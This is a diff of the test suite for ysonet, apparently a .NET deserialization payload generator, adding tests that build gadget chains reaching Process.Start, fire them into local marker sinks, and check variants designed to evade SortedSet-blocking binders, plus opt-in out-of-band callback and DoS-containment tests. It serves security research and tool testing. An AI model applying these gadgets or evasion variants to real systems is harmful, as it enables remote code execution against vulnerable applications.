@@ -1,4 +1,4 @@
-using NDesk.Options;
+﻿using NDesk.Options;
 using System;
 using System.Collections.Generic;
 using System.IO;
@@ -19,9 +19,53 @@ namespace ysonet.Tests
         private static int _passed = 0;
         private static int _failed = 0;
 
+        // Opt-in: allow the suite to actually BUILD a denial-of-service payload.
+        // Off by default, so no tier of this suite ever generates one, and no test
+        // has to pass an acknowledgement to do its job: the DoS gadgets are simply
+        // left out of every sweep and the containment test checks the refusal
+        // instead. A maintainer who wants the generation half runs the suite with
+        // the --dos argument or the YSONET_DOS_TESTS env var. Nothing here ever
+        // deserializes such a payload; the fire helpers refuse one outright.
+        private static bool _dosGenerationAllowed = false;
+
         private static int Main(string[] args)
         {
             if (Environment.GetEnvironmentVariable("YSONET_DUMPUI") != null) { DumpUi(); return 0; }
+            // Hidden self-spawned probe: deserialize one XAML-container payload and exit.
+            // XamlContainersEvadeSortedSetBinder runs it in a child process because firing the
+            // XAML wrapper in-process can fail-fast the CLR (see that test).
+            string containerProbe = Environment.GetEnvironmentVariable(XamlContainerProbeVar);
+            if (containerProbe != null) return XamlContainerProbe(containerProbe);
+            _dosGenerationAllowed = Array.IndexOf(args, "--dos") >= 0
+                || Environment.GetEnvironmentVariable("YSONET_DOS_TESTS") != null;
+            SweepStaleTestArtifacts();
+
+            // OOB tier (opt-in, separate): out-of-band callback observation. These are
+            // the only tests that send anything off this machine, so they never run in
+            // NORMAL or FULL. They exist for an effect an in-process loopback listener
+            // cannot see - the SMB/UNC callback, where SMB is fixed at port 445 and the
+            // Windows SMB client owns the loopback UNC path. Enable with the --oob arg
+            // or the YSONET_OOB_TESTS env var. They need interactsh-client; install it
+            // with tools\interactsh\get-interactsh.ps1 (see that folder's README for the
+            // self-hosted server option). Without the client, every row logs a clear
+            // skip reason instead of failing.
+            //
+            // They run FIRST, before the local tiers, on purpose: they are network
+            // bound and depend on nothing the other tests set up, so their result should
+            // not sit behind minutes of unrelated local rows (a wedged compile in the
+            // NORMAL tier would otherwise hide it completely).
+            if (Array.IndexOf(args, "--oob") >= 0
+                || Environment.GetEnvironmentVariable("YSONET_OOB_TESTS") != null)
+            {
+                Console.Error.WriteLine("---- OOB tier (out-of-band callback observation) ----");
+                Run("UNC short-name expansion calls out (a plain UNC path does not)", UncShortNameExpansionIsObservedOutOfBand);
+                Run("UNC-callback gadgets are observed out of band", UncCallbackGadgetsAreObservedOutOfBand);
+                Console.Error.WriteLine();
+            }
+
+            Run("Test artifact directories are tried in the documented order", TestArtifactDirOrdering);
+            Run("Artifact write falls through blocked and AV-deleted locations", TestArtifactWriteFallsThrough);
+            Run("Stale test artifacts are swept, live ones kept", StaleArtifactSweep);
             Run("Picker.Filter ranks exact, prefix, contains", PickerFilterRanking);
             Run("Picker.Filter empty query returns all", PickerFilterEmpty);
             Run("Picker.Filter no match returns empty", PickerFilterNoMatch);
@@ -68,6 +112,53 @@ namespace ysonet.Tests
             Run("Editor blocks a variant+formatter mismatch at generate", EditorBlocksVariantFormatterMismatch);
             Run("Guard rejects variant+formatter mismatch on the non-UI path", GuardBlocksVariantFormatterOnNonUiPath);
             Run("DataTable implicit default equals explicit variant 1 (byte-for-byte)", DataTableDefaultEqualsVariantOne);
+            Run("TypeConfuseDelegate implicit default equals explicit variant 1 (byte-for-byte)", TypeConfuseDelegateDefaultEqualsVariantOne);
+            Run("TypeConfuseDelegate rejects a variant outside 1-3", TypeConfuseDelegateVariantOptionIsValidated);
+            Run("TypeConfuseDelegate container variants drop the SortedSet wire name", TypeConfuseDelegateVariantRootsAvoidSortedSetName);
+            Run("TypeConfuseDelegate variants 2/3 fire through a SortedSet-blocking binder", TypeConfuseDelegateVariantsEvadeSortedSetBinder);
+            Run("TypeConfuseDelegate variants 2/3 need distinct command and argument strings", TypeConfuseDelegateVariantKeyEdgeCases);
+            Run("TypeConfuseDelegate containers are all generic, so SoapFormatter stays impossible", TypeConfuseDelegateContainersCannotUseSoapFormatter);
+            Run("An outer gadget's --variant does not reach its inner TypeConfuseDelegate", OuterVariantDoesNotReachTheInnerTypeConfuseDelegate);
+            Run("Editor offers the TypeConfuseDelegate container labels and emits the number", EditorExposesTypeConfuseDelegateContainerVariants);
+            Run("The shared container builder keeps every original TypeConfuseDelegate graph", TypeConfuseDelegateSharedBuilderKeepsTheOriginalGraphs);
+            Run("TypeConfuseDelegate notes a swapped --rawcmd split in debug mode only", TypeConfuseDelegateNotesSwappedArgumentsInDebugOnly);
+            Run("File operations serialize an ordinal comparer and the real file sink", FileOperationsSerializeAnOrdinalComparerAndTheRealSink);
+            Run("File operations order arguments ordinally, not by the operator's culture", FileOperationsOrderingIsOrdinalNotCultural);
+            Run("File operations refuse an order the primitive cannot represent", FileOperationsRefuseAnImpossibleOrder);
+            Run("File operations split -c on the first ';' and keep both fields verbatim", FileOperationsParseTheCommandStrictly);
+            Run("File operations embed the local content file at generation time", FileOperationsWriteEmbedsTheLocalFileAtGenerationTime);
+            Run("File operations validate the variant and root container selectors", FileOperationsOptionsAreValidated);
+            Run("File operation root containers swap only the serialized root", FileOperationsRootContainersSwapOnlyTheRoot);
+            Run("File operation containers are generic, so SoapFormatter stays impossible", FileOperationsCannotUseSoapFormatter);
+            Run("File operations refuse a --minify that would rewrite the delivered text", FileOperationsRefuseLossyMinification);
+            Run("File operation target paths resolve on the target, not in ysonet", FileOperationsTargetPathsAreRelativeToTheTarget);
+            Run("Editor offers the five file operations and the root container option", EditorExposesTheFileOperationVariants);
+            Run("DataViewManagerXxe carries the real setter, DOCTYPE and URL on every formatter", DataViewManagerXxeCarriesTheRealCarrierAndDoctype);
+            Run("DataViewManagerXxe validates the DTD URL and allows query strings", DataViewManagerXxeValidatesTheDtdUrl);
+            Run("DataViewManagerXxe --minify keeps the DOCTYPE and the parameter entity", DataViewManagerXxeMinifyKeepsTheDoctype);
+            Run("DataViewManagerXxe declares a remote URL input and a network kind", DataViewManagerXxeDeclaresUrlInputAndNetworkKind);
+            Run("DataViewManagerXxe advertises only setter-calling formatters", DataViewManagerXxeAdvertisesOnlySetterFormatters);
+            Run("TempFileCollection rebuilds the real type and its four delete fields", TempFileCollectionCarriesTheRealTypeAndFields);
+            Run("TempFileCollection collects -c plus repeated --extrafile and touches no path", TempFileCollectionOptionParsing);
+            Run("TempFileCollection keeps UNC and relative target paths verbatim", TempFileCollectionKeepsUncAndRelativePathsVerbatim);
+            Run("TempFileCollection refuses -t before anything can construct the target", TempFileCollectionRefusesSelfTest);
+            Run("TempFileCollection refuses a target path it would rewrite", TempFileCollectionRefusesAPathItWouldRewrite);
+            Run("TempFileCollection info panel still shows its formatters, input and categories", TempFileCollectionInfoPanelStillShowsItsFacts);
+            Run("XAML root container: no option equals --rootcontainer 1 (byte-for-byte)", XamlContainerDefaultEqualsContainerOne);
+            Run("XAML root container rejects a value outside 1-3", XamlContainerOptionIsValidated);
+            Run("XAML root containers 2/3 drop the SortedSet wire name", XamlContainerRootsAvoidSortedSetName);
+            Run("XAML root containers 2/3 parse their XAML through a SortedSet-blocking binder", XamlContainersEvadeSortedSetBinder);
+            Run("XAML root container is accepted and ignored by the TextFormattingRunProperties wrapper", XamlContainerIsIgnoredByTheTfrpWrapper);
+            Run("XAML root containers are all generic, so SoapFormatter stays impossible", XamlContainersCannotUseSoapFormatter);
+            Run("Editor offers the XAML root container as a plain option, not a variant", EditorExposesTheXamlContainerOption);
+            Run("A variant can declare gadget options it does not use", VariantOptionScopeDataModel);
+            Run("Editor hides (and stops emitting) an option the selected variant does not use", EditorHidesAnOptionTheVariantDoesNotUse);
+            Run("The XAML wrapper self-test runs in a child process and leaves the host alive", XamlWrapperSelfTestSurvivesTheHostProcess);
+            Run("An isolated self-test refuses a gadget with its own SerializationBinder", IsolatedSelfTestRefusesACustomBinder);
+            Run("Every gadget variant generates from the variant flag alone", EveryVariantGeneratesFromTheVariantFlagAlone);
+            Run("GenericIdentity carries the derived root type and inherited-field name", GenericIdentityCarriesDerivedType);
+            Run("FormsIdentity BinaryFormatter fires under AssemblyFormat=Full", FormsIdentityFiresUnderFullAssemblyMode);
+            Run("DataContractJsonSerializer fires for the ClaimsIdentity family", DataContractJsonFiresForClaimsFamily);
             Run("Option heuristics recover choices/default/required", OptionHeuristics);
             Run("Editor builds plugin fields with defaults and a gadget picker", EditorPluginFields);
             Run("Editor exposes actions and marks module-own options", EditorActionsAndOwnership);
@@ -138,14 +229,33 @@ namespace ysonet.Tests
             Run("GetterSettingsPropertyValue Xaml uses the compact byte array", GspvXamlUsesCompactByteArray);
             Run("GetterSettingsPropertyValue Xaml is minified with --minify", GspvXamlMinifies);
             Run("DataSetOldBehaviourFromFile --compressed shrinks via a GZip payload chain", DataSetFromFileCompressedIsSmaller);
-            Run("NetNonRceGadgets Xaml payloads are minified with --minify", NetNonRceXamlMinifies);
+            Run("Non-RCE payloads are first-class gadgets with accurate inputs and facets", NonRcePayloadsAreGadgets);
+            Run("Non-RCE gadget payloads are minified with --minify", NonRcePayloadsMinify);
             Run("Every gadget generates a non-empty payload from valid inputs", EveryGadgetGeneratesAPayload);
             Run("Every safe plugin generates a payload; the rest are explicitly excluded", EverySafePluginGeneratesAPayload);
+
+            // ---- Denial-of-service category and its safeguards ----
+            Run("DoS policy detects the facet on a gadget and on a single variant", DosPolicyDetectsVariantLevelFacet);
+            Run("DoS policy reads facets the same way the capability expansion does", DosPolicyAgreesWithFacetExpansion);
+            Run("DoS refusal names the acknowledgement flag", DosRefusalMessageNamesTheFlag);
+            Run("DoS warning states the risk and keeps the gadget's own details", DosWarningTextIsActionable);
+            Run("DoS acknowledgement survives DeepCopy and stays out of the gadget args", DosAcknowledgementSurvivesInputArgsCopy);
+            Run("The generator wrapper refuses a DoS gadget without the acknowledgement", GenericGeneratorRefusesDosWithoutAcknowledgement);
+            Run("The shared bulk partition excludes every DoS gadget and nothing else", DosBulkPartitionExcludesEveryDosGadget);
+            Run("The equivalent command carries the acknowledgement once, never as a gadget option", DosAcknowledgementCommandEcho);
+            Run("The acknowledgement field is offered only for a DoS selection", DosAcknowledgementFieldFollowsSelections);
+            Run("Every registered DoS gadget is contained (refused, warned, out of bulk)", DosGadgetsAreContained);
 
             // ---- Category facets (metadata + discovery) ----
             Run("Facet vocabulary is broad, unique, and labelled", FacetVocabularyIsBroadAndValid);
             Run("Every gadget expands to normalized capability units", EveryGadgetExpandsToCapabilities);
-            Run("Default facets are honest (uncategorized + derived input)", DefaultFacetsAreHonest);
+            Run("Default facets are honest (uncategorized + unspecified + derived input)", DefaultFacetsAreHonest);
+            Run("Runtime version vocabulary is ordered, unique, and labelled", VersionVocabularyIsOrderedAndValid);
+            Run("Runtime version ranges expand and refuse bad pairs", VersionRangeExpandsAndGuards);
+            Run("Runtime version input resolves the forms users type", VersionResolveAcceptsUserForms);
+            Run("Version support is declared only where it is evidenced", VersionSupportIsEvidenced);
+            Run("Variant overrides keep the gadget's runtime versions", VariantOverridesKeepTheirVersions);
+            Run("Version summary collapses a declared range", VersionSummaryCollapsesRanges);
             Run("Input derivation covers all CommandInputType values", InputDerivationCoversCommandInputTypes);
             Run("Explicit inputs replace the derived input", ExplicitInputsReplaceDerivedInput);
             Run("Uncategorized cannot mix with a real value; unknowns rejected", UncategorizedCannotMix);
@@ -187,8 +297,14 @@ namespace ysonet.Tests
             {
                 Console.Error.WriteLine();
                 Console.Error.WriteLine("---- FULL tier (exhaustive combination suite) ----");
+                // The build every fire below happens on. It is the evidence behind the
+                // runtime version facet, so name it once, up front, in the log.
+                Console.Error.WriteLine("Runtime: " + RuntimeBuild.Describe());
                 Run("Every gadget x formatter x variant generates (x minify)", GadgetFullMatrixGenerates);
+                Run("XAML container x formatter x minify generates for both consumers", XamlContainerFullMatrix);
                 Run("Payloads fire into test-owned sinks (marker/listener/tempdir/self-cs)", PayloadsFireIntoTestSinks);
+                // Must follow the matrix: it reads what that matrix just fired.
+                Run("Runtime version claims match what fired on this build", VersionEvidenceMatchesThisRuntime);
                 Run("Output encodings correct per formatter (representative gadgets)", OutputEncodingPerFormatter);
                 Run("Bridged gadget chains (--bgc) generate for every consumer", BridgedChainsGenerate);
                 Run("Bridged chains propagate --minify to the whole chain (raw vs min)", BridgedChainsMinifyPropagates);
@@ -783,7 +899,7 @@ namespace ysonet.Tests
 
         private static void WizardOutputToFile()
         {
-            string file = Path.Combine(Path.GetTempPath(), "ysonet_wizard_test_out.bin");
+            string file = TestArtifactPath("ysonet_wizard_test_out.bin");
             if (File.Exists(file)) File.Delete(file);
 
             var keys = new ScriptedKeyReader();
@@ -879,6 +995,14 @@ namespace ysonet.Tests
             AssertEqual(CommandInputType.DllPath, Gadget("GetterCompilerResults").CommandInput(), "GetterCompilerResults takes a DLL path");
             AssertEqual(CommandInputType.Url, Gadget("ObjRef").CommandInput(), "ObjRef takes a URL");
             AssertEqual(CommandInputType.FilePath, Gadget("XamlImageInfo").CommandInput(), "XamlImageInfo takes a file path");
+            // A path the TARGET touches, not a file read here. FileLogTraceListener was
+            // moved off FilePath for exactly that reason: the FilePath help says "this
+            // gadget reads the file", which was never true of it.
+            AssertEqual(CommandInputType.TargetPath, Gadget("FileLogTraceListener").CommandInput(),
+                "FileLogTraceListener takes a path on the target");
+            AssertEqual(CommandInputType.TargetPathAndLocalFile,
+                Gadget("TypeConfuseDelegateFileOperations").CommandInput(),
+                "TypeConfuseDelegateFileOperations defaults to target path + local content file");
 
             // Prompt labels follow the type.
             AssertEqual("Command to run", Wizard.CommandLabel(CommandInputType.ShellCommand), "shell label");
@@ -886,6 +1010,35 @@ namespace ysonet.Tests
             AssertEqual("URL", Wizard.CommandLabel(CommandInputType.Url), "url label");
             AssertEqual("calc.exe", Wizard.CommandDefault(CommandInputType.ShellCommand), "shell default");
             AssertEqual("", Wizard.CommandDefault(CommandInputType.DllPath), "dll has no default");
+
+            // Every input type needs its own menu name, prompt label and help sentence, or
+            // a new one silently inherits the shell-command wording. The help must also say
+            // whose file system a path belongs to, which is the whole point of the split.
+            var seenNames = new HashSet<string>(StringComparer.Ordinal);
+            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
+            {
+                AssertTrue(seenNames.Add(Wizard.InputTypeName(t)),
+                    "CommandInputType." + t + " has its own menu name");
+                AssertTrue(!string.IsNullOrEmpty(Wizard.CommandLabel(t)),
+                    "CommandInputType." + t + " has a prompt label");
+                AssertTrue(!string.IsNullOrEmpty(Wizard.CommandHelp(t)),
+                    "CommandInputType." + t + " has help text");
+            }
+            // A path or URL has no sensible default; only the shell-style inputs get one.
+            foreach (CommandInputType t in Enum.GetValues(typeof(CommandInputType)))
+            {
+                bool shellStyle = t == CommandInputType.ShellCommand || t == CommandInputType.Ignored;
+                AssertEqual(shellStyle ? "calc.exe" : "", Wizard.CommandDefault(t),
+                    "CommandInputType." + t + " default value");
+            }
+            foreach (CommandInputType t in new[] { CommandInputType.TargetPath,
+                CommandInputType.TargetPathPair, CommandInputType.TargetPathAndLocalFile })
+                AssertTrue(Wizard.CommandHelp(t).Contains("TARGET"),
+                    "CommandInputType." + t + " help says the path belongs to the target");
+            AssertTrue(Wizard.CommandHelp(CommandInputType.TargetPathAndLocalFile).Contains("THIS machine"),
+                "the write help also names the operator-side file");
+            AssertTrue(Wizard.CommandHelp(CommandInputType.FilePath).Contains("HERE"),
+                "FilePath help says the file is read on this machine");
         }
 
         private static void IgnoredCommandGadget()
@@ -937,7 +1090,22 @@ namespace ysonet.Tests
             AssertEqual(2, Gadget("ActivitySurrogateSelector").Variants().Count, "ASS declares 2 variants");
             AssertEqual(2, Gadget("ActivitySurrogateSelectorFromFile").Variants().Count, "ASSFromFile inherits 2 variants");
             AssertEqual(2, Gadget("ResourceSet").Variants().Count, "ResourceSet (ig option) declares 2 variants");
-            AssertEqual(0, Gadget("TypeConfuseDelegate").Variants().Count, "TypeConfuseDelegate has no variants");
+
+            // TypeConfuseDelegate selects the serialized ROOT CONTAINER that carries the
+            // same Comparison<string> -> Process.Start splice. Variant 1 is the original
+            // SortedSet default; 2 and 3 are the SortedSet-wire-name evasion roots.
+            var tcd = Gadget("TypeConfuseDelegate").Variants();
+            AssertEqual(3, tcd.Count, "TypeConfuseDelegate declares 3 container variants");
+            for (int i = 0; i < tcd.Count; i++)
+            {
+                AssertEqual(i + 1, tcd[i].Number, "TypeConfuseDelegate variant " + (i + 1) + " is numbered " + (i + 1));
+                AssertTrue(!string.IsNullOrEmpty(tcd[i].Label), "TypeConfuseDelegate variant " + (i + 1) + " carries a label");
+                AssertEqual(0, tcd[i].UnsupportedFormatters.Count,
+                    "TypeConfuseDelegate variant " + (i + 1) + " opts out of no formatter (the container swap does not narrow the set)");
+            }
+            AssertTrue(tcd[0].Label.IndexOf("SortedSet", StringComparison.OrdinalIgnoreCase) >= 0, "variant 1 is labelled SortedSet");
+            AssertTrue(tcd[1].Label.IndexOf("SortedDictionary", StringComparison.OrdinalIgnoreCase) >= 0, "variant 2 is labelled SortedDictionary");
+            AssertTrue(tcd[2].Label.IndexOf("TreeSet", StringComparison.OrdinalIgnoreCase) >= 0, "variant 3 is labelled TreeSet");
 
             var v = Gadget("ObjectDataProvider").Variants();
             AssertEqual(1, v[0].Number, "first variant is number 1");
@@ -1076,6 +1244,141 @@ namespace ysonet.Tests
             AssertTrue(dtV2bin.Success, "DataTable variant 2 + BinaryFormatter generates: " + dtV2bin.ErrorMessage);
         }
 
+        // GenericIdentity reaches the ClaimsIdentity nested-BinaryFormatter sink through a
+        // DIFFERENT root type than the ClaimsIdentity gadget. Because GenericIdentity derives
+        // from ClaimsIdentity, the inherited private field is exposed by FormatterServices
+        // under the prefixed name "ClaimsIdentity+m_serializedClaims" (SOAP encodes the plus as
+        // _x002B_). Lock both facts so the payload cannot silently regress to the plain
+        // ClaimsIdentity root type or the unprefixed field name, which would not deserialize
+        // onto a GenericIdentity.
+        private static void GenericIdentityCarriesDerivedType()
+        {
+            GenerationRequest bfReq = new GenerationRequest
+            {
+                GadgetName = "GenericIdentity",
+                FormatterName = "BinaryFormatter",
+                OutputFormat = "",
+                InputArgs = CalcInput(),
+            };
+            RunResult bf = PayloadRunner.GenerateGadget(bfReq);
+            AssertTrue(bf.Success, "GenericIdentity BinaryFormatter generates: " + bf.ErrorMessage);
+            string bfText = System.Text.Encoding.ASCII.GetString((byte[])bf.Raw);
+            AssertTrue(bfText.Contains("System.Security.Principal.GenericIdentity"),
+                "BinaryFormatter payload carries the GenericIdentity root type");
+            AssertTrue(bfText.Contains("ClaimsIdentity+m_serializedClaims"),
+                "BinaryFormatter payload uses the inherited prefixed field name");
+
+            GenerationRequest soapReq = new GenerationRequest
+            {
+                GadgetName = "GenericIdentity",
+                FormatterName = "SoapFormatter",
+                OutputFormat = "",
+                InputArgs = CalcInput(),
+            };
+            RunResult soap = PayloadRunner.GenerateGadget(soapReq);
+            AssertTrue(soap.Success, "GenericIdentity SoapFormatter generates: " + soap.ErrorMessage);
+            string soapText = soap.Raw is byte[] ? System.Text.Encoding.ASCII.GetString((byte[])soap.Raw) : (string)soap.Raw;
+            AssertTrue(soapText.Contains("GenericIdentity"),
+                "SoapFormatter payload carries the GenericIdentity element");
+            AssertTrue(soapText.Contains("ClaimsIdentity_x002B_m_serializedClaims"),
+                "SoapFormatter payload uses the XML-encoded inherited prefixed field name");
+        }
+
+        // DataContractJsonSerializer needs its root type supplied at construction (the JSON has
+        // no resolvable type token), so the generic fire markers cannot drive it. This fires each
+        // ClaimsIdentity-family gadget's DCJson payload with the correct root type and asserts the
+        // inner TFRP executes (marker), raw and minified. The post-fire cast throws after firing;
+        // the marker file is the proof.
+        private static void DataContractJsonFiresForClaimsFamily()
+        {
+            const string mscorlib = "mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089";
+            var map = new List<string[]>
+            {
+                new[] { "ClaimsIdentity",   "System.Security.Claims.ClaimsIdentity, " + mscorlib },
+                new[] { "GenericIdentity",  "System.Security.Principal.GenericIdentity, " + mscorlib },
+                new[] { "ClaimsPrincipal",  "System.Security.Claims.ClaimsPrincipal, " + mscorlib },
+                new[] { "GenericPrincipal", "System.Security.Principal.GenericPrincipal, " + mscorlib },
+                new[] { "FormsIdentity",    "System.Web.Security.FormsIdentity, System.Web, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a" },
+            };
+            foreach (string[] entry in map)
+            {
+                string gadget = entry[0];
+                string aqn = entry[1];
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    string marker = MarkerPath("DCJson_" + gadget + (minify ? "_m" : ""));
+                    SafeDelete(marker);
+                    try
+                    {
+                        InputArgs ia = new InputArgs();
+                        ia.Cmd = MarkerCommand(marker);
+                        ia.IsRawCmd = true;
+                        ia.Test = false;
+                        ia.Minify = minify;
+                        GenerationRequest req = new GenerationRequest
+                        {
+                            GadgetName = gadget,
+                            FormatterName = "DataContractJsonSerializer",
+                            OutputFormat = "",
+                            InputArgs = ia,
+                        };
+                        RunResult r = PayloadRunner.GenerateGadget(req);
+                        AssertTrue(r.Success, "DCJson generate " + gadget + ": " + r.ErrorMessage);
+
+                        string json = (string)r.Raw;
+                        RunSTA(delegate { SerializersHelper.DataContractJsonSerializer_deserialize(json, aqn, null); });
+
+                        AssertTrue(WaitForFile(marker, MarkerWaitMs),
+                            "DataContractJsonSerializer fires for " + gadget + (minify ? " (minify)" : ""));
+                    }
+                    finally { SafeDelete(marker); }
+                }
+            }
+        }
+
+        // FormsIdentity is in System.Web, so its BinaryFormatter stream carries an explicit
+        // BinaryAssembly record and the required _Ticket member. The standard fire markers
+        // deserialize in the default Simple assembly mode, which tolerates missing members.
+        // This locks the stricter Full mode: it proves the System.Web assembly record and the
+        // _Ticket member are actually present and correct, not just tolerated. The inner TFRP
+        // fires Process.Start (dropping the marker) then throws a cast error; the marker is the
+        // proof of execution.
+        private static void FormsIdentityFiresUnderFullAssemblyMode()
+        {
+            string marker = MarkerPath("FormsIdentity_BF_Full");
+            SafeDelete(marker);
+            try
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = MarkerCommand(marker);
+                ia.IsRawCmd = true;
+                ia.Test = false;
+                GenerationRequest req = new GenerationRequest
+                {
+                    GadgetName = "FormsIdentity",
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = ia,
+                };
+                RunResult r = PayloadRunner.GenerateGadget(req);
+                AssertTrue(r.Success, "FormsIdentity BinaryFormatter generates: " + r.ErrorMessage);
+
+                byte[] payload = (byte[])r.Raw;
+                RunSTA(delegate
+                {
+                    var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+                    bf.AssemblyFormat = System.Runtime.Serialization.Formatters.FormatterAssemblyStyle.Full;
+                    using (var ms = new MemoryStream(payload))
+                        bf.Deserialize(ms);
+                });
+
+                AssertTrue(WaitForFile(marker, MarkerWaitMs),
+                    "FormsIdentity BinaryFormatter payload fires under AssemblyFormat=Full");
+            }
+            finally { SafeDelete(marker); }
+        }
+
         // Drive PayloadRunner.GenerateGadget for one gadget/formatter/variant with a
         // never-executed placeholder command (Test=false), the same as a matrix cell.
         private static RunResult GenerateWithVariant(string gadget, string formatter, int variant)
@@ -1139,6 +1442,2476 @@ namespace ysonet.Tests
                 InputArgs = ia,
             };
             return PayloadRunner.GenerateGadget(req);
+        }
+
+        // ---- TypeConfuseDelegate root-container variants -----------------------
+        //
+        // Variants 2 and 3 keep the Comparison<string> -> Process.Start splice and only
+        // change the serialized ROOT: SortedDictionary<string,string> (whose serialized
+        // TreeSet<KeyValuePair<string,string>> backing set forwards key comparisons through
+        // KeyValuePairComparer) and the internal TreeSet<string>. They exist to evade a
+        // binder or blocklist that rejects the exact SortedSet wire type name.
+
+        // Generate TypeConfuseDelegate with a never-executed placeholder command. Pass
+        // variant=null for the implicit default (no --variant).
+        private static RunResult GenerateTcd(string formatter, bool minify, bool useSimpleType, int? variant)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = "calc.exe";
+            ia.Test = false;
+            ia.Minify = minify;
+            ia.UseSimpleType = useSimpleType;
+            if (variant.HasValue)
+                ia.ExtraArguments = new List<string> { "--variant", variant.Value.ToString() };
+            GenerationRequest req = new GenerationRequest
+            {
+                GadgetName = "TypeConfuseDelegate",
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            };
+            return PayloadRunner.GenerateGadget(req);
+        }
+
+        private static readonly string[] TcdFormatters =
+            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
+
+        // Adding the container selector must not change the default payload: with no
+        // option, TypeConfuseDelegate must produce the exact same bytes as an explicit
+        // --variant 1, for every advertised formatter and every minify/usesimpletype
+        // combination - including the two hardcoded NRBF paths (--minify --ust with
+        // BinaryFormatter and LosFormatter), which stay gated on variant 1. This compares
+        // two live generations rather than a frozen hash, so it survives payload evolution.
+        private static void TypeConfuseDelegateDefaultEqualsVariantOne()
+        {
+            foreach (string formatter in TcdFormatters)
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    for (int u = 0; u < 2; u++)
+                    {
+                        bool minify = m == 1, ust = u == 1;
+                        string desc = "TypeConfuseDelegate -f " + formatter
+                            + (minify ? " (minify)" : "") + (ust ? " (ust)" : "");
+
+                        RunResult def = GenerateTcd(formatter, minify, ust, null);
+                        RunResult v1 = GenerateTcd(formatter, minify, ust, 1);
+
+                        AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
+                        AssertTrue(v1.Success, "explicit variant 1 generates: " + desc + " -> " + v1.ErrorMessage);
+
+                        byte[] a = def.Raw as byte[];
+                        byte[] b = v1.Raw as byte[];
+                        AssertTrue(a != null && b != null, "both payloads are byte streams: " + desc);
+                        AssertTrue(BytesEqual(a, b),
+                            "implicit default equals explicit variant 1 byte-for-byte: " + desc);
+                    }
+                }
+            }
+
+            // The hardcoded minified NRBF path belongs to variant 1 only, so the other two
+            // containers must take the normal Serialize() route and produce different bytes.
+            foreach (string formatter in new[] { "BinaryFormatter", "LosFormatter" })
+            {
+                byte[] one = (byte[])GenerateTcd(formatter, true, true, 1).Raw;
+                foreach (int v in new[] { 2, 3 })
+                {
+                    RunResult other = GenerateTcd(formatter, true, true, v);
+                    AssertTrue(other.Success, "variant " + v + " generates on the minify+ust " + formatter
+                        + " path: " + other.ErrorMessage);
+                    AssertTrue(!BytesEqual(one, (byte[])other.Raw),
+                        "variant " + v + " does not reuse the hardcoded variant-1 NRBF stream (" + formatter + ")");
+                }
+            }
+        }
+
+        // The variant option must reject anything that is not 1, 2, or 3 instead of quietly
+        // falling back to the default, which would hide a typo behind a payload the user did
+        // not ask for.
+        private static void TypeConfuseDelegateVariantOptionIsValidated()
+        {
+            foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
+            {
+                InputArgs ia = new InputArgs();
+                ia.Cmd = "calc.exe";
+                ia.Test = false;
+                ia.ExtraArguments = new List<string> { "--variant", bad };
+                RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                {
+                    GadgetName = "TypeConfuseDelegate",
+                    FormatterName = "BinaryFormatter",
+                    OutputFormat = "",
+                    InputArgs = ia,
+                });
+                AssertTrue(!r.Success, "--variant " + bad + " is rejected");
+                AssertTrue((r.ErrorMessage ?? "").IndexOf("variant must be 1, 2, or 3", StringComparison.OrdinalIgnoreCase) >= 0,
+                    "--variant " + bad + " reports the allowed values: " + r.ErrorMessage);
+            }
+
+            foreach (int good in new[] { 1, 2, 3 })
+                AssertTrue(GenerateTcd("BinaryFormatter", false, false, good).Success,
+                    "--variant " + good + " is accepted");
+        }
+
+        // The point of variants 2 and 3 is the wire type names, so assert them directly on
+        // the BinaryFormatter stream: the chosen root must be present and the SortedSet name
+        // must be gone. Variant 2 must also carry the inner TreeSet backing set that actually
+        // triggers the comparer.
+        private static void TypeConfuseDelegateVariantRootsAvoidSortedSetName()
+        {
+            const string sortedSet = "System.Collections.Generic.SortedSet`1";
+            const string treeSet = "System.Collections.Generic.TreeSet`1";
+            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";
+
+            string v1 = TcdStreamText(1);
+            AssertTrue(v1.Contains(sortedSet), "variant 1 still serializes a SortedSet root");
+
+            string v2 = TcdStreamText(2);
+            AssertTrue(v2.Contains(sortedDict), "variant 2 serializes a SortedDictionary root");
+            AssertTrue(v2.Contains(treeSet), "variant 2 carries the inner TreeSet backing set");
+            AssertTrue(v2.Contains("KeyValuePairComparer"), "variant 2 carries the KeyValuePairComparer that forwards key comparisons");
+            AssertTrue(!v2.Contains(sortedSet), "variant 2 emits no SortedSet type record");
+
+            string v3 = TcdStreamText(3);
+            AssertTrue(v3.Contains(treeSet), "variant 3 serializes a TreeSet root");
+            AssertTrue(!v3.Contains(sortedDict), "variant 3 does not wrap the set in a dictionary");
+            AssertTrue(!v3.Contains(sortedSet), "variant 3 emits no SortedSet type record");
+
+            // The delegate primitive is unchanged in all three.
+            foreach (var pair in new[] { new[] { "1", v1 }, new[] { "2", v2 }, new[] { "3", v3 } })
+            {
+                AssertTrue(pair[1].Contains("System.DelegateSerializationHolder"),
+                    "variant " + pair[0] + " still carries the delegate serialization holder");
+                AssertTrue(pair[1].Contains("System.Diagnostics.Process"),
+                    "variant " + pair[0] + " still targets Process.Start");
+            }
+        }
+
+        // The raw BinaryFormatter bytes of one variant, read as ASCII so the embedded type
+        // name records can be searched.
+        private static string TcdStreamText(int variant)
+        {
+            RunResult r = GenerateTcd("BinaryFormatter", false, false, variant);
+            AssertTrue(r.Success, "TypeConfuseDelegate variant " + variant + " generates: " + r.ErrorMessage);
+            return Encoding.ASCII.GetString((byte[])r.Raw);
+        }
+
+        // A deliberately narrow blocklist: it rejects ONLY a type name that starts with the
